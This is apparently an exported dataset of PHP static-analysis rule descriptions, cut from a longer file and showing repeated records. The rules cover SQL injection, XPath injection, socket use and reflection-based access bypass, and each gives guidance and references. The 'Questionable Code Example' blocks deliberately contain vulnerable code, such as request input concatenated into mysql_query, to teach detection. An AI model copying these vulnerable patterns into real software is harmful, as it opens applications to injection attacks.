</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> PHP Data Objects (PDO) prepared statement with bound parameters should be preferred to native database functions. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Questionable Code Example</h2>
<pre>
$id = $_GET['id'];
mysql_connect('localhost', $username, $password) or die('Could not connect: ' . mysql_error());
mysql_select_db('myDatabase') or die('Could not select database');

$query = ""SELECT * FROM myTable WHERE id = "" + $id;
$result = mysql_query($query) or die('Query failed: ' . mysql_error());  // Questionable, seems to be susceptible to SQL injection

while ($row = mysql_fetch_object($result)) {
    echo $row-&gt;name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$id = $_GET['id'];
try {
    $conn = new PDO('mysql:host=localhost;dbname=myDatabase', $username, $password);
    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $stmt = $conn-&gt;prepare('SELECT * FROM myTable WHERE id = :id');
    $stmt-&gt;execute(array('id' =&gt; $id));

    while($row = $stmt-&gt;fetch(PDO::FETCH_OBJ)) {
        echo $row-&gt;name;
    }
} catch(PDOException $e) {
    echo 'ERROR: ' . $e-&gt;getMessage();
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if one of the functions is called with hard-coded string (no concatenation) and this string does not contain a ""$""
sign.</p>
<pre>
$result = mysql_query(""SELECT * FROM myTable WHERE id = 42"") or die('Query failed: ' . mysql_error());  // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",php:S2077,php,PHP,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include
input that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL
binding mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule raises an issue when an execution of SQL queries might be susceptible to SQL injection. The goal is to guide security code reviews.</p>
<p>The following native database functions don't support prepared statements, thus their use is considered susceptible to injection.</p>
<ul>
  <li> <code>mysql_query</code> </li>
  <li> <code>mysql_db_query</code> </li>
  <li> <code>mysql_unbuffered_query</code> </li>
  <li> <code>pg_update</code> </li>
  <li> <code>pg_query</code> </li>
  <li> <code>pg_send_query</code> </li>
  <li> <code>mssql_query</code> </li>
  <li> <code>mysqli_query</code> and <code>mysqli::query</code> </li>
  <li> <code>mysqli_real_query</code> and <code>mysqli::real_query</code> </li>
  <li> <code>mysqli_multi_query</code> and <code>mysqli::multi_query</code> </li>
  <li> <code>mysqli_send_query</code> and <code>mysqli::send_query</code> </li>
  <li> <code>PDO::query</code> </li>
  <li> <code>PDO::exec</code> </li>
</ul>
<p>In addition, the following function call will also raise an issue if the provided query is a string with one or more interpolated variable
(containing ""$"" sign).</p>
<ul>
  <li> <code>PDO::prepare</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> PHP Data Objects (PDO) prepared statement with bound parameters should be preferred to native database functions. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Questionable Code Example</h2>
<pre>
$id = $_GET['id'];
mysql_connect('localhost', $username, $password) or die('Could not connect: ' . mysql_error());
mysql_select_db('myDatabase') or die('Could not select database');

$query = ""SELECT * FROM myTable WHERE id = "" + $id;
$result = mysql_query($query) or die('Query failed: ' . mysql_error());  // Questionable, seems to be susceptible to SQL injection

while ($row = mysql_fetch_object($result)) {
    echo $row-&gt;name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$id = $_GET['id'];
try {
    $conn = new PDO('mysql:host=localhost;dbname=myDatabase', $username, $password);
    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $stmt = $conn-&gt;prepare('SELECT * FROM myTable WHERE id = :id');
    $stmt-&gt;execute(array('id' =&gt; $id));

    while($row = $stmt-&gt;fetch(PDO::FETCH_OBJ)) {
        echo $row-&gt;name;
    }
} catch(PDOException $e) {
    echo 'ERROR: ' . $e-&gt;getMessage();
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if one of the functions is called with hard-coded string (no concatenation) and this string does not contain a ""$""
sign.</p>
<pre>
$result = mysql_query(""SELECT * FROM myTable WHERE id = 42"") or die('Query failed: ' . mysql_error());  // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",Executing SQL queries is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'sans-top25-insecure', 'sql']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
function evaluate_xpath($doc, $xpathstring, $xmlstring)
{
    $xpath = new DOMXpath($doc);
    $xpath-&gt;query($xpathstring); // Questionable
    $xpath-&gt;evaluate($xpathstring); // Questionable

    // There is no risk if the xpath is hardcoded
    $xpath-&gt;query(""/users/user[@name='alice']""); // Compliant
    $xpath-&gt;evaluate(""/users/user[@name='alice']""); // Compliant

    // An issue will also be created if the SimpleXMLElement is created
    // by simplexml_load_file, simplexml_load_string or simplexml_import_dom
    $xml = new SimpleXMLElement($doc);
    $xml-&gt;xpath($xpathstring); // Questionable

    // There is no risk if the xpath is hardcoded
    $xml-&gt;xpath(""/users/user[@name='alice']""); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",php:S4817,php,PHP,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
function evaluate_xpath($doc, $xpathstring, $xmlstring)
{
    $xpath = new DOMXpath($doc);
    $xpath-&gt;query($xpathstring); // Questionable
    $xpath-&gt;evaluate($xpathstring); // Questionable

    // There is no risk if the xpath is hardcoded
    $xpath-&gt;query(""/users/user[@name='alice']""); // Compliant
    $xpath-&gt;evaluate(""/users/user[@name='alice']""); // Compliant

    // An issue will also be created if the SimpleXMLElement is created
    // by simplexml_load_file, simplexml_load_string or simplexml_import_dom
    $xml = new SimpleXMLElement($doc);
    $xml-&gt;xpath($xpathstring); // Questionable

    // There is no risk if the xpath is hardcoded
    $xml-&gt;xpath(""/users/user[@name='alice']""); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",Executing XPath expressions is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
function handle_sockets($domain, $type, $protocol, $port, $backlog, $addr, $hostname, $local_socket, $remote_socket, $fd) {
    socket_create($domain, $type, $protocol); // Questionable
    socket_create_listen($port, $backlog); // Questionable
    socket_addrinfo_bind($addr); // Questionable
    socket_addrinfo_connect($addr); // Questionable
    socket_create_pair($domain, $type, $protocol, $fd);

    fsockopen($hostname); // Questionable
    pfsockopen($hostname); // Questionable
    stream_socket_server($local_socket); // Questionable
    stream_socket_client($remote_socket); // Questionable
    stream_socket_pair($domain, $type, $protocol); // Questionable
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S4818,php,PHP,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
function handle_sockets($domain, $type, $protocol, $port, $backlog, $addr, $hostname, $local_socket, $remote_socket, $fd) {
    socket_create($domain, $type, $protocol); // Questionable
    socket_create_listen($port, $backlog); // Questionable
    socket_addrinfo_bind($addr); // Questionable
    socket_addrinfo_connect($addr); // Questionable
    socket_create_pair($domain, $type, $protocol, $fd);

    fsockopen($hostname); // Questionable
    pfsockopen($hostname); // Questionable
    stream_socket_server($local_socket); // Questionable
    stream_socket_client($remote_socket); // Questionable
    stream_socket_pair($domain, $type, $protocol); // Questionable
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using Sockets is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Changing or bypassing accessibility is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681"">CVE-2012-4681</a> </li>
</ul>
<p><code>private</code> methods were made <code>private</code> for a reason, and the same is true of every other visibility level. Altering or
bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could introduce security holes.</p>
<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is a good reason to override the existing accessibility level of the method/field. This is very rarely the case. Accessing hidden fields
  and methods will make your code unstable as they are not part of the public API and may change in future versions. </li>
  <li> this method is called by untrusted code. <strong>*</strong> </li>
  <li> it is possible to modify or bypass the accessibility of sensitive methods or fields using this code. <strong>*</strong> </li>
</ul>
<p><strong>*</strong> You are at risk if you answered yes to those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don't change or bypass the accessibility of any method or field if possible.</p>
<p>If untrusted code can execute this method, make sure that it cannot decide which method or field's accessibility can be modified or bypassed.</p>
<h2>Questionable Code Example</h2>
<pre>
class MyClass
{
    public static $publicstatic = 'Static';
    private static $privatestatic = 'private Static';
    private $private = 'Private';
    private const CONST_PRIVATE = 'Private CONST';
    public $myfield = 42;

    private function __construct() {}
    private function privateMethod() {}
    public function __set($property, $value)  {}
    public function __get($property) {}
}

$clazz = new ReflectionClass('MyClass');

$clazz-&gt;getstaticProperties(); // Questionable. This gives access to private static properties

$clazz-&gt;setStaticPropertyValue('publicstatic', '42'); // OK as there is no overloading to bypass and it respects access control.
$clazz-&gt;getStaticPropertyValue('publicstatic'); // OK as there is no overloading to bypass and it respects access control.

// The following calls can access private or protected constants.
$clazz-&gt;getConstant('CONST_PRIVATE'); // Questionable.
$clazz-&gt;getConstants(); // Questionable.
$clazz-&gt;getReflectionConstant('CONST_PRIVATE'); // Questionable.
$clazz-&gt;getReflectionConstants(); // Questionable.

$obj = $clazz-&gt;newInstanceWithoutConstructor(); // Questionable. Bypassing private constructor.

$constructor = $clazz-&gt;getConstructor();
$constructorClosure = $constructor-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$constructor-&gt;setAccessible(true); // Questionable. Bypassing constructor accessibility.

$prop = new ReflectionProperty('MyClass', 'private');
$prop-&gt;setAccessible(true); // Questionable. Change accessibility of a property.
$prop-&gt;setValue($obj, ""newValue""); // Questionable. Bypass of the __set method.
$prop-&gt;getValue($obj); // Questionable. Bypass of the __get method.

$prop2 = $clazz-&gt;getProperties()[2];
$prop2-&gt;setAccessible(true); // Questionable. Change accessibility of a property.
$prop2-&gt;setValue($obj, ""newValue""); // Questionable. Bypass of the __set method.
$prop2-&gt;getValue($obj); // Questionable. Bypass of the __get method.

$meth = new ReflectionMethod('MyClass', 'privateMethod');
$clos = $meth-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$meth-&gt;setAccessible(true); // Questionable. Change accessibility of a method.

$meth2 = $clazz-&gt;getMethods()[0];
$clos2 = $meth2-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$meth2-&gt;setAccessible(true); // Questionable. Change accessibility of a method.

// Using a ReflectionObject instead of the class

$objr = new ReflectionObject($obj);
$objr-&gt;newInstanceWithoutConstructor(); // Questionable. Bypassing private constructor.

$objr-&gt;getStaticPropertyValue(""publicstatic""); // OK as there is no overloading to bypass and it respects access control.
$objr-&gt;setStaticPropertyValue(""publicstatic"", ""newValue""); // OK as there is no overloading to bypass and it respects access control.

$objr-&gt;getStaticProperties(); // Questionable. This gives access to private static properties

// The following calls can access private or protected constants.
$objr-&gt;getConstant('CONST_PRIVATE'); // Questionable.
$objr-&gt;getConstants(); // Questionable.
$objr-&gt;getReflectionConstant('CONST_PRIVATE'); // Questionable.
$objr-&gt;getReflectionConstants(); // Questionable.

$constructor = $objr-&gt;getConstructor();
$constructorClosure = $constructor-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$constructor-&gt;setAccessible(true); // Questionable. Bypassing constructor accessibility.

$prop3 = $objr-&gt;getProperty('private');
$prop3-&gt;setAccessible(true); // Questionable. Change accessibility of a property.
$prop3-&gt;setValue($obj, ""newValue""); // Questionable. Bypass of the __set method.
$prop3-&gt;getValue($obj); // Questionable. Bypass of the __get method.

$prop4 = $objr-&gt;getProperties()[2];
$prop4-&gt;setAccessible(true); // Questionable. Change accessibility of a property.
$prop4-&gt;setValue($obj, ""newValue""); // Questionable. Bypass of the __set method.
$prop4-&gt;getValue($obj); // Questionable. Bypass of the __get method.

$meth3 = $objr-&gt;getMethod('privateMethod');
$clos3 = $meth3-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$meth3-&gt;setAccessible(true); // Questionable. Change accessibility of a method.

$meth4 = $objr-&gt;getMethods()[0];
$clos4 = $meth4-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$meth4-&gt;setAccessible(true); // Questionable. Change accessibility of a method.
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3YEVAQ"">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of
  classes, methods, or fields </li>
</ul>",php:S3011,php,PHP,"<p>Changing or bypassing accessibility is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681"">CVE-2012-4681</a> </li>
</ul>
<p><code>private</code> methods were made <code>private</code> for a reason, and the same is true of every other visibility level. Altering or
bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could introduce security holes.</p>
<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is a good reason to override the existing accessibility level of the method/field. This is very rarely the case. Accessing hidden fields
  and methods will make your code unstable as they are not part of the public API and may change in future versions. </li>
  <li> this method is called by untrusted code. <strong>*</strong> </li>
  <li> it is possible to modify or bypass the accessibility of sensitive methods or fields using this code. <strong>*</strong> </li>
</ul>
<p><strong>*</strong> You are at risk if you answered yes to those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don't change or bypass the accessibility of any method or field if possible.</p>
<p>If untrusted code can execute this method, make sure that it cannot decide which method or field's accessibility can be modified or bypassed.</p>
<h2>Questionable Code Example</h2>
<pre>
class MyClass
{
    public static $publicstatic = 'Static';
    private static $privatestatic = 'private Static';
    private $private = 'Private';
    private const CONST_PRIVATE = 'Private CONST';
    public $myfield = 42;

    private function __construct() {}
    private function privateMethod() {}
    public function __set($property, $value)  {}
    public function __get($property) {}
}

$clazz = new ReflectionClass('MyClass');

$clazz-&gt;getstaticProperties(); // Questionable. This gives access to private static properties

$clazz-&gt;setStaticPropertyValue('publicstatic', '42'); // OK as there is no overloading to bypass and it respects access control.
$clazz-&gt;getStaticPropertyValue('publicstatic'); // OK as there is no overloading to bypass and it respects access control.

// The following calls can access private or protected constants.
$clazz-&gt;getConstant('CONST_PRIVATE'); // Questionable.
$clazz-&gt;getConstants(); // Questionable.
$clazz-&gt;getReflectionConstant('CONST_PRIVATE'); // Questionable.
$clazz-&gt;getReflectionConstants(); // Questionable.

$obj = $clazz-&gt;newInstanceWithoutConstructor(); // Questionable. Bypassing private constructor.

$constructor = $clazz-&gt;getConstructor();
$constructorClosure = $constructor-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$constructor-&gt;setAccessible(true); // Questionable. Bypassing constructor accessibility.

$prop = new ReflectionProperty('MyClass', 'private');
$prop-&gt;setAccessible(true); // Questionable. Change accessibility of a property.
$prop-&gt;setValue($obj, ""newValue""); // Questionable. Bypass of the __set method.
$prop-&gt;getValue($obj); // Questionable. Bypass of the __get method.

$prop2 = $clazz-&gt;getProperties()[2];
$prop2-&gt;setAccessible(true); // Questionable. Change accessibility of a property.
$prop2-&gt;setValue($obj, ""newValue""); // Questionable. Bypass of the __set method.
$prop2-&gt;getValue($obj); // Questionable. Bypass of the __get method.

$meth = new ReflectionMethod('MyClass', 'privateMethod');
$clos = $meth-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$meth-&gt;setAccessible(true); // Questionable. Change accessibility of a method.

$meth2 = $clazz-&gt;getMethods()[0];
$clos2 = $meth2-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$meth2-&gt;setAccessible(true); // Questionable. Change accessibility of a method.

// Using a ReflectionObject instead of the class

$objr = new ReflectionObject($obj);
$objr-&gt;newInstanceWithoutConstructor(); // Questionable. Bypassing private constructor.

$objr-&gt;getStaticPropertyValue(""publicstatic""); // OK as there is no overloading to bypass and it respects access control.
$objr-&gt;setStaticPropertyValue(""publicstatic"", ""newValue""); // OK as there is no overloading to bypass and it respects access control.

$objr-&gt;getStaticProperties(); // Questionable. This gives access to private static properties

// The following calls can access private or protected constants.
$objr-&gt;getConstant('CONST_PRIVATE'); // Questionable.
$objr-&gt;getConstants(); // Questionable.
$objr-&gt;getReflectionConstant('CONST_PRIVATE'); // Questionable.
$objr-&gt;getReflectionConstants(); // Questionable.

$constructor = $objr-&gt;getConstructor();
$constructorClosure = $constructor-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$constructor-&gt;setAccessible(true); // Questionable. Bypassing constructor accessibility.

$prop3 = $objr-&gt;getProperty('private');
$prop3-&gt;setAccessible(true); // Questionable. Change accessibility of a property.
$prop3-&gt;setValue($obj, ""newValue""); // Questionable. Bypass of the __set method.
$prop3-&gt;getValue($obj); // Questionable. Bypass of the __get method.

$prop4 = $objr-&gt;getProperties()[2];
$prop4-&gt;setAccessible(true); // Questionable. Change accessibility of a property.
$prop4-&gt;setValue($obj, ""newValue""); // Questionable. Bypass of the __set method.
$prop4-&gt;getValue($obj); // Questionable. Bypass of the __get method.

$meth3 = $objr-&gt;getMethod('privateMethod');
$clos3 = $meth3-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$meth3-&gt;setAccessible(true); // Questionable. Change accessibility of a method.

$meth4 = $objr-&gt;getMethods()[0];
$clos4 = $meth4-&gt;getClosure($obj); // Questionable. It is possible to call private methods with closures.
$meth4-&gt;setAccessible(true); // Questionable. Change accessibility of a method.
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
